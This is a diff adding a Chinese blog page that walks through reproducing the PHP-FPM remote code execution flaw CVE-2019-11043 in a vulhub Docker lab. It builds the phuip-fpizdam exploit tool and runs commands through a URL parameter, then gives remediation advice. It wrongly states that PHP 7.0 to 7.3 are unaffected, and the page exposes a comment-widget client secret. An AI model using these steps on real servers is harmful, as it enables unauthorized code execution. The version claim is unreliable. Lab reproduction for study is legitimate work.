@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>CVE-2019-11043漏洞复现(PHP-FPM远程代码执行) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="CVE-2019-11043漏洞复现(PHP-FPM远程代码执行) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="CVE-2019-11043漏洞复现(PHP-FPM远程代码执行)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/PJEZYOdiL/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/漏洞复现/" class="tag">漏洞复现</a>
+            
+        </span>
+            <h1>CVE-2019-11043漏洞复现(PHP-FPM远程代码执行)</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-02，2 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p><strong>漏洞介绍</strong><br>
+Nginx与php-fpm服务器上存在的一处高危漏洞，由于Nginx的fastcgi_split_path_info模块在处理带 %0a 的请求时，对换行符 \n 处置不当使得将PATH_INFO值置为空，从而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。目前开源社区已有漏洞Poc公开。</p>
+<!-- more -->
+<p><strong>影响范围</strong><br>
+Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p>
+<pre><code>location ~ [^/]\.php(/|$) {
+   fastcgi_split_path_info ^(.+?\.php)(/.*)$;
+   fastcgi_param PATH_INFO      $fastcgi_path_info;
+   fastcgi_pass   php:9000;
+  }
+}
+</code></pre>
+<p>PHP 7.0/7.1/7.2/7.3不受影响<br>
+<strong>漏洞环境:</strong></p>
+<pre><code>https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043
+docker-compose up -d
+</code></pre>
+<p>docker速度慢，如下操作</p>
+<pre><code>vim /etc/docker/daemon-reload
+{
+ &quot;registry-mirrors&quot;:[&quot;https://6kx4zyno.mirror.aliyuncs.com&quot;]
+}
+systemctl daemon-reload 
+systemctl restart docker
+</code></pre>
+<p>安装下go环境:</p>
+<pre><code>wget -c https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz
+tar -C /usr/local/ =xzf go1.8.3.linux-amd64.tar.gz
+vim /etc/profile
+最后加上一句
+export PATH=$PATH:/usr/local/go/bin
+source /etc/profile
+</code></pre>
+<p>利用工具:</p>
+<pre><code>https://github.com/neex/phuip-fpizdam
+go build
+</code></pre>
+<p><strong>漏洞复现</strong><br>
+访问IP:8080<br>
+<img src="https://guokeya.github.io/post-images/1577951446457.png" alt="" loading="lazy"><br>
+./phuip-fpizdam http://192.168.0.128:8080/index.php --skip-attack<br>
+无损漏洞检测<br>
+<img src="https://guokeya.github.io/post-images/1577951452936.png" alt="" loading="lazy"><br>
+./phuip-fpizdam http://192.168.0.128:8080/index.php<br>
+<img src="https://guokeya.github.io/post-images/1577951458052.png" alt="" loading="lazy"><br>
+http://192.168.0.128:8080/index.php?a=id<br>
+<img src="https://guokeya.github.io/post-images/1577951462827.png" alt="" loading="lazy"><br>
+修复方案<br>
+修改nginx配置文件中fastcgi_split_path_info的正则表达式,不允许.php之后传入不可显字符。<br>
+暂停使用nginx+php-fpm 服务<br>
+在不影响正常业务的情况下，删除Nginx配置文件中的如下配置：<br>
+fastcgi_split_path_info ^（。+？\。php）（/.*）$;<br>
+fastcgi_param PATH_INFO $ fastcgi_path_info;</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/sGZIuaKKU/">
+              <span class="post-title">
+                域渗透(PTH)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
